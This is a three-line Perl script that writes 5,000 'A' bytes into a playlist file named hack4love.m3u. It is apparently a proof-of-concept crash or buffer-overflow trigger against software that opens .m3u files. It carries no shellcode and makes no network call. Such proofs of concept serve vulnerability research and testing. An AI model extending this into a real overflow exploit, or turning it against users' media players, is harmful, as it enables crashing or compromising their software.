my $crash="\x41" x 5000;
open(myfile,'>>hack4love.m3u');
print myfile $crash;
